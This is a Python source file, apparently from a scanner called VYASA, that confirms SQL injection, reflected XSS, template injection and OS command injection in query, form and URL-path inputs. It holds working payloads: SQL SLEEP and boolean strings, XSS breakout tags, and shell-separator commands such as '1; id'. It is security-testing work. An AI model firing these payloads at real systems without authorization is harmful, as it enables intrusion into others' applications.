"""
Confirmation-Gated Injection Detection Engine for VYASA.

Actively CONFIRMS the two highest-impact injection classes - SQL Injection
(SQLi) and Cross-Site Scripting (XSS) - across three input vectors:

    * query-string parameters   (?id=..., ?q=...)
    * POST form fields           (application/x-www-form-urlencoded)
    * URL PATH segments          (/search/<payload>/, /users/<payload>)

Design principle (VYASA strict-PoC policy):
    A vulnerability is reported ONLY when actively confirmed by reproducible
    evidence. Suspicion, reflection-without-execution, or a single anomalous
    response are NEVER enough. Every positive carries a machine-checkable proof
    marker ("CONFIRMED VIA ...") that the validation layer re-verifies before
    the finding reaches a report.

Internally every vector is reduced to a `sender` callable
    send(value, timeout_override=None) -> (response_or_None, elapsed_seconds)
so the SQLi (error/boolean/time) and XSS (context-aware) confirmation logic is
written once and reused for params and path segments alike.

Intended for AUTHORIZED engagements only.
"""

from __future__ import annotations

import re
import time
import string
import secrets
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs, quote


# ---------------------------------------------------------------------------
# Result container
# ---------------------------------------------------------------------------

@dataclass
class InjectionProof:
    """Structured confirmation result for a single injectable input."""
    confirmed: bool
    vuln_class: str                      # "SQLi" | "XSS" | ...
    technique: str                       # e.g. "error-based", "time-based blind", "html-context"
    param: str = ""                      # parameter name OR path-segment label
    vector: str = "query"                # "query" | "form" | "path"
    method: str = "GET"
    payload: str = ""
    evidence: str = ""                   # human-readable, carries a CONFIRMED VIA marker when confirmed
    request_summary: str = ""
    response_summary: str = ""
    # Two-state model mirrored from the VYASA extension: only "confirmed" drives
    # the risk score; "suspected" is a genuine maybe worth manual review.
    state: str = "confirmed"             # "confirmed" | "suspected"
    context: str = ""                    # reflection context (XSS)
    filter_profile: Dict[str, str] = field(default_factory=dict)  # char -> raw|encoded|stripped
    sample_payload: str = ""             # context-specific PoC the operator can paste
    extras: Dict[str, str] = field(default_factory=dict)


# ---------------------------------------------------------------------------
# Default parameter name lists (used when no real params are known)
# ---------------------------------------------------------------------------

SQLI_DEFAULT_PARAMS = [
    "id", "cat", "user_id", "product_id", "pid", "item", "page", "sort",
    "order", "dir", "search", "q", "query", "filter", "name", "offset", "limit",
]

XSS_DEFAULT_PARAMS = [
    "q", "search", "query", "s", "term", "keyword", "name", "input", "comment",
    "message", "msg", "body", "title", "bio", "text", "redirect", "returnUrl",
]

_PH = "__VYASA_INJECT__"   # placeholder marking where a payload goes in a path


# ---------------------------------------------------------------------------
# SQL error signatures (expanded, cross-DBMS)
# ---------------------------------------------------------------------------

SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax", "warning: mysql", "mysql_fetch",
    "valid mysql result", "mysqli", "com.mysql.jdbc", "unclosed quotation mark",
    "check the manual that corresponds to your", "mysql_num_rows", "mysql_query",
    "pg_query", "pg_exec", "postgresql query failed", "syntax error at or near",
    "psycopg2", "unterminated quoted string", "operator does not exist",
    "microsoft ole db", "odbc sql server driver", "sqlserver", "incorrect syntax near",
    "unclosed quotation mark after the character string", "microsoft jet database",
    "ora-00933", "ora-01756", "ora-00921", "ora-00936", "quoted string not properly terminated",
    "oracle error", "oracle.jdbc",
    "sqlite3.operationalerror", "sqlite_error", "sqlite3", "unrecognized token",
    "near \"'\":", "sql logic error",
    "sqlalchemy.exc", "operationalerror", "programmingerror", "integrityerror",
    "pdoexception", "queryexception", "sql syntax", "sql error", "database error",
    "jdbcsqlexception", "syntax error in query expression",
]


# ---------------------------------------------------------------------------
# Senders
# ---------------------------------------------------------------------------

def _raw_send(session, method: str, url: str, params: Dict[str, str],
              timeout: float):
    """Perform one HTTP request; return (response_or_None, elapsed_seconds).

    Redirects are FOLLOWED: real apps frequently 301/302 to normalize a path
    (add/remove a trailing slash, lower-case, canonical host) before rendering
    the page that reflects the input. With redirects disabled the probe would
    only ever see the 3xx and miss the reflection entirely - a common cause of
    false negatives on path-based reflected XSS.
    """
    start = time.time()
    try:
        if (method or "GET").upper() == "POST":
            r = session.post(url, data=params, timeout=timeout, verify=False, allow_redirects=True)
        else:
            r = session.get(url, params=params, timeout=timeout, verify=False, allow_redirects=True)
        return r, time.time() - start
    except Exception:
        return None, time.time() - start


def _mk_param_sender(session, method: str, url: str, param: str,
                     base_params: Dict[str, str], timeout: float) -> Callable:
    """Sender that injects `value` into a single query/form parameter."""
    def send(value: str, timeout_override: Optional[float] = None):
        data = dict(base_params)
        data[param] = value
        return _raw_send(session, method, url, data, timeout_override or timeout)
    return send


def _mk_path_sender(session, url_template: str, timeout: float) -> Callable:
    """Sender that injects `value` into a URL path (replacing the _PH marker).

    The payload is percent-encoded the way a browser encodes a path (slashes
    preserved), so a server that URL-decodes and reflects it will echo the raw
    characters - exactly the behaviour behind /search/<script>...</script>/.
    """
    def send(value: str, timeout_override: Optional[float] = None):
        encoded = quote(str(value), safe="/")
        full = url_template.replace(_PH, encoded)
        start = time.time()
        try:
            r = session.get(full, timeout=timeout_override or timeout,
                            verify=False, allow_redirects=True)
            return r, time.time() - start
        except Exception:
            return None, time.time() - start
    return send


def _path_templates(url: str, limit: int = 5) -> List[Tuple[str, str]]:
    """Build URL templates (containing _PH) for path-segment injection.

    Returns (template_url, human_label) pairs: append a new trailing segment,
    and substitute each existing segment in turn.
    """
    parsed = urlparse(url)
    scheme = parsed.scheme or "http"
    netloc = parsed.netloc or parsed.path  # tolerate bare host
    base = f"{scheme}://{netloc}"
    path = parsed.path if parsed.scheme else "/"
    segs = [s for s in (path or "/").split("/") if s]

    out: List[Tuple[str, str]] = []
    joined = "/".join(segs)
    base_path = f"/{joined}" if joined else ""

    # 1. Append the payload as a new trailing path segment.
    out.append((f"{base}{base_path}/{_PH}/", f"path (appended to {path or '/'})"))

    # 2. Substitute each existing segment with the payload.
    for i in range(len(segs)):
        new = segs[:]
        new[i] = _PH
        out.append((f"{base}/" + "/".join(new), f"path segment #{i + 1} of {path}"))

    # 3. Root-level injection when there is no path.
    if not segs:
        out.append((f"{base}/{_PH}/", "path (root segment)"))

    # De-dup, cap.
    seen, uniq = set(), []
    for t, lbl in out:
        if t in seen:
            continue
        seen.add(t)
        uniq.append((t, lbl))
    return uniq[:limit]


def _norm_len(text: str) -> int:
    """Length after collapsing volatile whitespace/digits so dynamic noise
    (timestamps, counters) does not dominate boolean comparisons."""
    if not text:
        return 0
    collapsed = re.sub(r"\s+", " ", text)
    collapsed = re.sub(r"\d", "", collapsed)
    return len(collapsed)


# ---------------------------------------------------------------------------
# SQL Injection confirmation (sender-based)
# ---------------------------------------------------------------------------

_BOOL_PAIRS = [
    (" AND 1=1", " AND 1=2"),
    ("' AND '1'='1", "' AND '1'='2"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    ("' AND '1'='1'-- -", "' AND '1'='2'-- -"),
    (") AND (1=1", ") AND (1=2"),
]
_BOOL_PAIRS_CONFIRM = [
    (" AND 7=7", " AND 7=8"),
    ("' AND '7'='7", "' AND '7'='8"),
    ("\" AND \"7\"=\"7", "\" AND \"7\"=\"8"),
    ("' AND '7'='7'-- -", "' AND '7'='8'-- -"),
    (") AND (7=7", ") AND (7=8"),
]
_TIME_PAYLOADS = [
    "' AND SLEEP({D})-- -",
    "\" AND SLEEP({D})-- -",
    " AND SLEEP({D})",
    "' OR SLEEP({D})-- -",
    "'||pg_sleep({D})||'",
    "' AND 1=(SELECT 1 FROM PG_SLEEP({D}))-- -",
    "'; WAITFOR DELAY '0:0:{D}'-- -",
    "\"; WAITFOR DELAY '0:0:{D}'-- -",
    "1) AND SLEEP({D})-- -",
]


def _sqli_confirm_sender(send: Callable, orig_val: str, where: str, vector: str,
                         timeout: float, time_delay: int) -> Optional[InjectionProof]:
    """Run error/boolean/time-based confirmation through one sender."""
    base_resp, _ = send(orig_val)
    if base_resp is None:
        return None
    base_body = base_resp.text or ""
    base_low = base_body.lower()

    # ===== 1. ERROR-BASED =====
    for q in ("'", "\"", "')", "';"):
        er, _ = send(f"{orig_val}{q}")
        if er is None:
            continue
        el = (er.text or "").lower()
        hit = next((s for s in SQL_ERROR_SIGNATURES if s in el and s not in base_low), None)
        if not hit and er.status_code == 500 and er.status_code != base_resp.status_code:
            if any(k in el for k in ("sql", "syntax", "database", "query", "mysql", "postgres", "sqlite", "ora-")):
                hit = "500 database error triggered by quote"
        if hit:
            return InjectionProof(
                confirmed=True, vuln_class="SQLi", technique="error-based",
                param=where, vector=vector, payload=f"{orig_val}{q}",
                evidence=(f"CONFIRMED VIA error-based SQLi: injecting {q!r} into {where} produced "
                          f"DBMS error signature '{hit}' that was absent from the clean baseline."),
                request_summary=f"{where} = {orig_val}{q}",
                response_summary=f"HTTP {er.status_code} ({len(er.text)} bytes)",
            )

    # ===== 2. BOOLEAN-BASED =====
    base_resp2, _ = send(orig_val)
    if base_resp2 is not None:
        b1, b2 = _norm_len(base_body), _norm_len(base_resp2.text or "")
        if b1 > 0 and abs(b1 - b2) <= max(8, int(0.02 * b1)):
            proof = _try_boolean(send, orig_val, where, vector, b1, base_resp.status_code)
            if proof:
                return proof

    # ===== 3. TIME-BASED =====
    return _try_time_based(send, orig_val, where, vector, timeout, time_delay)


def _try_boolean(send, orig_val, where, vector, baseline_len, baseline_status):
    """Confirm boolean-based blind SQLi via two independent true/false pairs."""
    def classify(suffix):
        r, _ = send(f"{orig_val}{suffix}")
        if r is None:
            return None
        return r.status_code, _norm_len(r.text or "")

    tol = max(8, int(0.02 * baseline_len))
    diff_floor = max(40, int(0.20 * baseline_len))

    for (t_suf, f_suf), (t2_suf, f2_suf) in zip(_BOOL_PAIRS, _BOOL_PAIRS_CONFIRM):
        tr, fr = classify(t_suf), classify(f_suf)
        if not tr or not fr:
            continue
        t_status, t_len = tr
        f_status, f_len = fr
        true_matches_baseline = (t_status == baseline_status and abs(t_len - baseline_len) <= tol)
        false_differs = (f_status != baseline_status) or (abs(f_len - baseline_len) >= diff_floor)
        true_false_differ = (t_status != f_status) or (abs(t_len - f_len) >= diff_floor)
        if true_matches_baseline and false_differs and true_false_differ:
            tr2, fr2 = classify(t2_suf), classify(f2_suf)
            if tr2 and fr2:
                repro_true = (tr2[0] == baseline_status and abs(tr2[1] - baseline_len) <= tol)
                repro_false = (fr2[0] != baseline_status) or (abs(fr2[1] - baseline_len) >= diff_floor)
                if repro_true and repro_false:
                    return InjectionProof(
                        confirmed=True, vuln_class="SQLi", technique="boolean-based blind",
                        param=where, vector=vector, payload=f"{orig_val}{t_suf} / {f_suf}",
                        evidence=(f"CONFIRMED VIA boolean-based blind SQLi: on {where}, a TRUE condition "
                                  f"('{t_suf.strip()}') returned the baseline response (~{baseline_len} chars) "
                                  f"while a FALSE condition ('{f_suf.strip()}') produced a materially different "
                                  f"response (~{f_len} chars). The differential reproduced with an independent "
                                  f"7=7/7=8 pair, confirming the input alters the SQL WHERE clause."),
                        request_summary=f"{where} = ...{t_suf} vs ...{f_suf}",
                        response_summary=f"true≈{t_len} chars, false≈{f_len} chars (baseline≈{baseline_len})",
                    )
    return None


def _try_time_based(send, orig_val, where, vector, timeout, delay):
    """Confirm time-based blind SQLi: injected SLEEP delays the response while a
    SLEEP(0) control stays fast, reproduced once."""
    long_timeout = max(timeout, delay + 5)
    threshold = delay * 0.85

    # Cap the DBMS sleep forms tried: on a non-injectable param each form is a
    # wasted round-trip, and the first few cover MySQL/PG/MSSQL/generic.
    for tmpl in _TIME_PAYLOADS[:4]:
        r1, e1 = send(f"{orig_val}{tmpl.format(D=delay)}", long_timeout)
        if r1 is None or e1 < threshold:
            continue
        rc, ec = send(f"{orig_val}{tmpl.format(D=0)}", long_timeout)
        if rc is None or ec >= (delay * 0.5):
            continue  # endpoint generally slow -> not confirmed
        r2, e2 = send(f"{orig_val}{tmpl.format(D=delay)}", long_timeout)
        if r2 is None or e2 < threshold:
            continue
        return InjectionProof(
            confirmed=True, vuln_class="SQLi", technique="time-based blind",
            param=where, vector=vector, payload=f"{orig_val}{tmpl.format(D=delay)}",
            evidence=(f"CONFIRMED VIA time-based blind SQLi: payload '{tmpl.format(D=delay)}' on {where} "
                      f"delayed the response by {e1:.1f}s and {e2:.1f}s (threshold {threshold:.1f}s) across "
                      f"two trials, while the SLEEP(0) control returned in {ec:.1f}s. The attacker-controlled "
                      f"time delay confirms injection."),
            request_summary=f"{where} = {tmpl.format(D=delay)}",
            response_summary=f"delayed {e1:.1f}s/{e2:.1f}s vs control {ec:.1f}s",
            extras={"delay_observed_s": f"{e1:.1f}"},
        )
    return None


def confirm_sqli(session, method: str, url: str, params: Optional[Dict[str, str]],
                 candidate_params: Optional[List[str]] = None,
                 timeout: float = 6.0, time_delay: int = 5,
                 max_params: int = 4, try_path: bool = True) -> Optional[InjectionProof]:
    """Confirm SQLi on `url` across query/form params and (GET) URL path segments.
    Returns an InjectionProof on the first proven vector, else None."""
    base_params = dict(params or {})
    names = list(base_params.keys())
    for n in (candidate_params or SQLI_DEFAULT_PARAMS):
        if n not in names:
            names.append(n)

    for param in names[:max_params]:
        send = _mk_param_sender(session, method, url, param, base_params, timeout)
        proof = _sqli_confirm_sender(send, base_params.get(param, "1"),
                                     f"parameter '{param}'",
                                     "form" if method.upper() == "POST" else "query",
                                     timeout, time_delay)
        if proof:
            proof.method = method.upper()
            return proof

    if try_path and method.upper() == "GET":
        for tmpl, label in _path_templates(url):
            send = _mk_path_sender(session, tmpl, timeout)
            proof = _sqli_confirm_sender(send, "1", label, "path", timeout, time_delay)
            if proof:
                proof.method = "GET"
                return proof

    return None


# ---------------------------------------------------------------------------
# XSS confirmation (sender-based, context-aware)
# ---------------------------------------------------------------------------

# Containers whose text content is not parsed as active markup; a tag payload
# there is inert unless it also closes the container, so we skip them.
_INERT_HTML_CONTAINERS = ("textarea", "title", "xmp", "noscript", "template", "style")

# Characters whose survival (raw / encoded / stripped) determines exploitability.
_PROBE_CHARS = ["<", ">", "\"", "'", "`", "(", ")", ";", "/", "=", "{", "}"]
_MARK_L, _MARK_R = "qzx", "xzq"
_ENC_MAP = {
    "<": ["&lt;", "%3c", "\\u003c", "&#60;", "&#x3c;"],
    ">": ["&gt;", "%3e", "\\u003e", "&#62;", "&#x3e;"],
    "\"": ["&quot;", "%22", "\\u0022", "&#34;", "\\\""],
    "'": ["&#39;", "&apos;", "%27", "\\u0027", "\\'"],
    "`": ["%60", "\\u0060"],
    "(": ["%28", "&#40;"], ")": ["%29", "&#41;"],
    ";": ["%3b"], "/": ["%2f", "&#47;"], "=": ["%3d"],
    "{": ["%7b"], "}": ["%7d"],
}


def _canary() -> str:
    return "vy" + "".join(secrets.choice(string.ascii_lowercase) for _ in range(7))


def _classify_context(body: str, canary: str) -> Optional[Dict[str, object]]:
    """Classify the first reflection of `canary` into an exploitability context
    (mirrors the VYASA extension). None if not reflected or inside an inert
    container (textarea/title/comment/...)."""
    idx = body.find(canary)
    if idx == -1:
        return None
    pre = body[max(0, idx - 240):idx]
    low = pre.lower()
    if low.rfind("<!--") > low.rfind("-->"):
        return None
    for tag in _INERT_HTML_CONTAINERS:
        if low.rfind("<" + tag) > low.rfind("</" + tag):
            return None
    count = body.count(canary)
    if low.rfind("<script") > low.rfind("</script"):
        in_str = bool(re.search(r"""["'`][^"'`]*$""", pre))
        return {"context": "js-string" if in_str else "js-code", "count": count}
    last_lt, last_gt = pre.rfind("<"), pre.rfind(">")
    if last_lt > last_gt:
        if re.search(r"""\b(href|src|action|formaction|data|poster|cite|background)\s*=\s*["']?[^"'>]*$""",
                     pre, re.I):
            return {"context": "url-attr", "count": count}
        m = re.search(r"""=(["'])[^"']*$""", pre)
        if m:
            return {"context": "attr-quoted", "quoted": m.group(1), "count": count}
        return {"context": "attr-unquoted", "count": count}
    return {"context": "html-text", "count": count}


def _probe_value() -> str:
    return _MARK_L + "|" + "|".join(_PROBE_CHARS) + "|" + _MARK_R


def _filter_profile(body: str) -> Optional[Dict[str, str]]:
    """From one marker probe, record each char as raw / encoded / stripped."""
    start = body.find(_MARK_L)
    if start == -1:
        return None
    end = body.find(_MARK_R, start)
    region = body[start:(end + len(_MARK_R)) if end != -1 else start + 220]
    low = region.lower()
    profile = {}
    for c in _PROBE_CHARS:
        if c in region:
            profile[c] = "raw"
        elif any(e.lower() in low for e in _ENC_MAP.get(c, [])):
            profile[c] = "encoded"
        else:
            profile[c] = "stripped"
    return profile


def _xss_verdict(context: str, prof: Optional[Dict[str, str]]) -> Tuple[str, str]:
    """(state, note) from context + which chars survived raw.
    state: "confirmed" (drives risk) | "suspected" (manual review) | "safe" (no finding)."""
    if not prof:
        return "suspected", "Reflected but filter profile unavailable."
    raw = lambda c: prof.get(c) == "raw"
    if context == "html-text":
        if raw("<") and raw(">"):
            return "confirmed", "Angle brackets reflect UNENCODED in HTML body - tag injection works."
        return "safe", "Reflects in HTML body but < or > is encoded/stripped."
    if context == "attr-unquoted":
        if raw("=") or raw("/") or raw(">"):
            return "confirmed", "Unquoted attribute with break chars intact - event-handler injection works."
        return "suspected", "Unquoted attribute but break chars filtered."
    if context == "attr-quoted":
        if raw("\"") or raw("'"):
            return "confirmed", "Quote survives inside quoted attribute - can break out and add a handler."
        return "safe", "Quoted attribute but the quote char is encoded."
    if context == "js-string":
        if (raw("'") or raw("\"") or raw("`")) and raw(";"):
            return "confirmed", "Quote + semicolon survive inside JS string - statement break works."
        if raw("'") or raw("\"") or raw("`"):
            return "suspected", "String quote survives in JS context; verify breakout manually."
        return "safe", "Reflects in JS but quotes are escaped."
    if context == "js-code":
        return "confirmed", "Input reflects directly into executable JS - high impact."
    if context == "url-attr":
        return "suspected", "Reflects into a URL attribute - check javascript: scheme / open redirect."
    return "suspected", "Reflected; context indeterminate."


def _payload_for_context(context: str, prof: Optional[Dict[str, str]]) -> str:
    if context == "html-text":
        return "<svg onload=alert(document.domain)>"
    if context == "attr-quoted":
        single = bool(prof) and prof.get("'") == "raw" and prof.get("\"") != "raw"
        return "'><svg onload=alert(document.domain)>" if single else '"><svg onload=alert(document.domain)>'
    if context == "attr-unquoted":
        return " onmouseover=alert(document.domain) vyx="
    if context == "url-attr":
        return "javascript:alert(document.domain)"
    if context == "js-string":
        return "';alert(document.domain)//"
    if context == "js-code":
        return "alert(document.domain)"
    return "<svg onload=alert(document.domain)>"


_CTX_TECHNIQUE = {
    "html-text": "html-context", "attr-quoted": "attribute-quoted",
    "attr-unquoted": "attribute-unquoted", "js-string": "js-string",
    "js-code": "js-code", "url-attr": "url-attribute",
}


def _xss_confirm_sender(send: Callable, where: str, vector: str) -> Optional[InjectionProof]:
    """Reflected-XSS confirmation through one sender: context classification +
    character-level filter fingerprint -> Confirmed / Suspected verdict (or None
    when safe / not reflected)."""
    canary = _canary()
    r1, _ = send(canary)
    if r1 is None:
        return None
    ctx = _classify_context(r1.text or "", canary)
    if ctx is None:
        return None
    context = ctx["context"]

    # 1) Context-agnostic BREAKOUT TAG confirmation - mirrors the real-world
    #    `"><script>...</script>` PoC. We inject a benign tag, optionally preceded
    #    by an attribute-breakout (`">` / `'>`), and if the raw <tag> comes back
    #    UNENCODED, HTML/script injection is definitively proven. Covers html-text
    #    AND attribute contexts (where the real payload must break out first).
    if context in ("html-text", "attr-quoted", "attr-unquoted", "url-attr"):
        tag = "vt" + _canary()[2:7]
        if context == "html-text":
            breakouts = [("html-context", f"<{tag}>", "<svg onload=alert(document.domain)>")]
        else:
            breakouts = [
                ("attribute-breakout", f'"><{tag}>', '"><svg onload=alert(document.domain)>'),
                ("attribute-breakout", f"'><{tag}>", "'><svg onload=alert(document.domain)>"),
                ("html-context", f"<{tag}>", "<svg onload=alert(document.domain)>"),
            ]
        for tech, payload, sample in breakouts:
            rt, _ = send(payload)
            if rt is not None and f"<{tag}>" in (rt.text or ""):
                return InjectionProof(
                    confirmed=True, vuln_class="XSS", technique=tech,
                    param=where, vector=vector, payload=payload, state="confirmed",
                    context=context, filter_profile={"<": "raw", ">": "raw"},
                    sample_payload=sample,
                    evidence=(f"CONFIRMED VIA reflected XSS ({tech}): injecting '{payload}' into {where} "
                              f"placed a raw, UNENCODED <{tag}> tag in the response "
                              f"({context} context) - tag/script injection works. PoC: {sample}"),
                    request_summary=f"{where} = {payload}",
                    response_summary=f"HTTP {rt.status_code}, raw tag reflected",
                )

    # 2) Filter fingerprint -> verdict for this context.
    r2, _ = send(_probe_value())
    prof = _filter_profile(r2.text or "") if r2 is not None else None
    state, note = _xss_verdict(context, prof)
    if state == "safe":
        return None

    technique = _CTX_TECHNIQUE.get(context, context)
    sample = _payload_for_context(context, prof)
    survived = [c for c, s in (prof or {}).items() if s == "raw"]
    if state == "confirmed":
        ev = (f"CONFIRMED VIA reflected XSS ({technique}): in {where} input reflects in a {context} context "
              f"and characters {survived} survived UNENCODED. {note} PoC: {sample}")
    else:
        ev = (f"SUSPECTED XSS ({technique}) in {where}: reflects in {context} context; {note} "
              f"Chars surviving raw: {survived}. Verify with: {sample}")
    return InjectionProof(
        confirmed=(state == "confirmed"), vuln_class="XSS", technique=technique,
        param=where, vector=vector, payload=sample, state=state,
        context=context, filter_profile=prof or {}, sample_payload=sample, evidence=ev,
        request_summary=f"{where} filter-probe",
        response_summary=f"context={context}, raw={survived}",
    )


def confirm_xss(session, method: str, url: str, params: Optional[Dict[str, str]],
                candidate_params: Optional[List[str]] = None,
                timeout: float = 6.0, max_params: int = 4,
                try_path: bool = True) -> Optional[InjectionProof]:
    """Confirm reflected XSS across query/form params and (GET) URL path segments.

    Returns the first CONFIRMED proof if any; else the best SUSPECTED proof
    (state="suspected", confirmed=False); else None. Fully-encoded reflections
    are treated as safe and yield nothing.
    """
    base_params = dict(params or {})
    names = list(base_params.keys())
    for n in (candidate_params or XSS_DEFAULT_PARAMS):
        if n not in names:
            names.append(n)

    suspected: Optional[InjectionProof] = None

    def consider(p: Optional[InjectionProof], meth: str) -> Optional[InjectionProof]:
        nonlocal suspected
        if p is None:
            return None
        p.method = meth
        if p.confirmed:
            return p
        if suspected is None:
            suspected = p
        return None

    for param in names[:max_params]:
        send = _mk_param_sender(session, method, url, param, base_params, timeout)
        got = consider(_xss_confirm_sender(send, f"parameter '{param}'",
                       "form" if method.upper() == "POST" else "query"), method.upper())
        if got:
            return got

    if try_path and method.upper() == "GET":
        for tmpl, label in _path_templates(url):
            got = consider(_xss_confirm_sender(_mk_path_sender(session, tmpl, timeout), label, "path"), "GET")
            if got:
                return got

    return suspected


# ---------------------------------------------------------------------------
# Server-Side Template Injection (SSTI) confirmation
# ---------------------------------------------------------------------------

SSTI_DEFAULT_PARAMS = ["q", "search", "name", "title", "input", "msg", "message",
                       "template", "view", "page", "id", "query"]

# (expression_template, engine-family label). __N__ is the arithmetic.
_SSTI_PROBES = [
    ("{{__N__}}", "Jinja2/Twig"),
    ("${__N__}", "Freemarker/JSP-EL"),
    ("#{__N__}", "Ruby/Thymeleaf"),
    ("<%= __N__ %>", "ERB"),
    ("{__N__}", "generic"),
]


def _ssti_confirm_sender(send, where, vector):
    """Confirm SSTI: a template expression must EVALUATE (7*7->49) and a second,
    different expression must evaluate too (8*8->64), with neither echoed
    literally. Reproducing with a second product rules out a coincidental '49'
    already on the page."""
    for tmpl, engine in _SSTI_PROBES:
        p1 = tmpl.replace("__N__", "7*7")
        r1, _ = send(p1)
        if r1 is None:
            continue
        b1 = r1.text or ""
        if "49" not in b1 or p1 in b1:        # not evaluated, or echoed verbatim
            continue
        p2 = tmpl.replace("__N__", "8*8")
        r2, _ = send(p2)
        if r2 is None:
            continue
        b2 = r2.text or ""
        if "64" in b2 and p2 not in b2:
            return InjectionProof(
                confirmed=True, vuln_class="SSTI", technique=f"template-eval ({engine})",
                param=where, vector=vector, payload=p1,
                evidence=(f"CONFIRMED VIA SSTI: expression {p1!r} evaluated to 49 and {p2!r} to 64 in "
                          f"{where} ({engine} syntax), with neither echoed literally - proving the server "
                          f"evaluates user input as a template (path to RCE)."),
                request_summary=f"{where} = {p1}",
                response_summary="evaluated 7*7->49 and 8*8->64",
            )
    return None


def confirm_ssti(session, method, url, params, candidate_params=None,
                 timeout=6.0, max_params=4, try_path=True):
    """Confirm SSTI across query/form params and (GET) path segments."""
    base_params = dict(params or {})
    names = list(base_params.keys())
    for n in (candidate_params or SSTI_DEFAULT_PARAMS):
        if n not in names:
            names.append(n)
    for param in names[:max_params]:
        send = _mk_param_sender(session, method, url, param, base_params, timeout)
        proof = _ssti_confirm_sender(send, f"parameter '{param}'",
                                     "form" if method.upper() == "POST" else "query")
        if proof:
            proof.method = method.upper()
            return proof
    if try_path and method.upper() == "GET":
        for tmpl, label in _path_templates(url):
            proof = _ssti_confirm_sender(_mk_path_sender(session, tmpl, timeout), label, "path")
            if proof:
                proof.method = "GET"
                return proof
    return None


# ---------------------------------------------------------------------------
# OS Command Injection confirmation
# ---------------------------------------------------------------------------

CMD_DEFAULT_PARAMS = ["cmd", "exec", "command", "ip", "host", "target", "domain",
                      "ping", "query", "q", "file", "name", "id"]

_CMD_OUTPUT_SIGS = ["uid=", "gid=", "groups=", "www-data", "nt authority\\", "root:x:0:0:"]
_CMD_SEPARATORS = [";", "|", "&&", "%0a"]


def _command_confirm_sender(send, where, vector, timeout, delay):
    """Confirm OS command injection by (1) command OUTPUT appearing (id/whoami)
    or (2) a reproduced time delay from an injected `sleep`, with a `sleep 0`
    control to rule out a generally-slow endpoint."""
    base, _ = send("1")
    base_low = (base.text or "").lower() if base else ""

    # 1. Output-based.
    for sep in _CMD_SEPARATORS:
        r, _ = send(f"1{sep} id")
        if r is None:
            continue
        low = (r.text or "").lower()
        hit = next((s for s in _CMD_OUTPUT_SIGS if s in low and s not in base_low), None)
        if hit:
            return InjectionProof(
                confirmed=True, vuln_class="CommandInjection", technique="output-based",
                param=where, vector=vector, payload=f"1{sep} id",
                evidence=(f"CONFIRMED VIA OS command injection: payload '1{sep} id' in {where} returned "
                          f"command output signature '{hit}' absent from the baseline, proving shell "
                          f"command execution."),
                request_summary=f"{where} = 1{sep} id",
                response_summary=f"command output '{hit}' in response",
            )

    # 2. Time-based.
    long_t = max(timeout, delay + 5)
    thr = delay * 0.85
    for sep in _CMD_SEPARATORS:
        r1, e1 = send(f"1{sep} sleep {delay}", long_t)
        if r1 is None or e1 < thr:
            continue
        rc, ec = send(f"1{sep} sleep 0", long_t)
        if rc is None or ec >= (delay * 0.5):
            continue
        r2, e2 = send(f"1{sep} sleep {delay}", long_t)
        if r2 is None or e2 < thr:
            continue
        return InjectionProof(
            confirmed=True, vuln_class="CommandInjection", technique="time-based",
            param=where, vector=vector, payload=f"1{sep} sleep {delay}",
            evidence=(f"CONFIRMED VIA OS command injection (time-based): '1{sep} sleep {delay}' in {where} "
                      f"delayed the response {e1:.1f}s and {e2:.1f}s (threshold {thr:.1f}s) while the "
                      f"'sleep 0' control returned in {ec:.1f}s - an attacker-controlled shell delay."),
            request_summary=f"{where} = 1{sep} sleep {delay}",
            response_summary=f"delayed {e1:.1f}s/{e2:.1f}s vs control {ec:.1f}s",
        )
    return None


def confirm_command(session, method, url, params, candidate_params=None,
                    timeout=6.0, time_delay=5, max_params=4, try_path=True):
    """Confirm OS command injection across query/form params and path segments."""
    base_params = dict(params or {})
    names = list(base_params.keys())
    for n in (candidate_params or CMD_DEFAULT_PARAMS):
        if n not in names:
            names.append(n)
    for param in names[:max_params]:
        send = _mk_param_sender(session, method, url, param, base_params, timeout)
        proof = _command_confirm_sender(send, f"parameter '{param}'",
                                        "form" if method.upper() == "POST" else "query",
                                        timeout, time_delay)
        if proof:
            proof.method = method.upper()
            return proof
    if try_path and method.upper() == "GET":
        for tmpl, label in _path_templates(url):
            proof = _command_confirm_sender(_mk_path_sender(session, tmpl, timeout),
                                            label, "path", timeout, time_delay)
            if proof:
                proof.method = "GET"
                return proof
    return None


# ---------------------------------------------------------------------------
# Convenience: build (method, url, params) targets from a crawled endpoint
# ---------------------------------------------------------------------------

def targets_from_endpoint(base_url: str, endpoint: Dict) -> List[Tuple[str, str, Dict[str, str]]]:
    """Turn a crawler endpoint dict into concrete (method, url, params) targets."""
    out: List[Tuple[str, str, Dict[str, str]]] = []
    path = endpoint.get("path", "/") if isinstance(endpoint, dict) else "/"
    sample = endpoint.get("sample_url") if isinstance(endpoint, dict) else None
    url = sample or f"{base_url.rstrip('/')}{path}"
    parsed = urlparse(url)
    clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}" if parsed.scheme else url
    existing = {k: (v[0] if v else "1") for k, v in parse_qs(parsed.query).items()}

    methods = endpoint.get("methods", ["GET"]) if isinstance(endpoint, dict) else ["GET"]
    param_names = endpoint.get("params", []) if isinstance(endpoint, dict) else []
    params = dict(existing)
    for p in param_names:
        params.setdefault(p, "1")

    for m in methods:
        out.append((m.upper(), clean_url, dict(params)))
    if not out:
        out.append(("GET", clean_url, dict(params)))
    return out
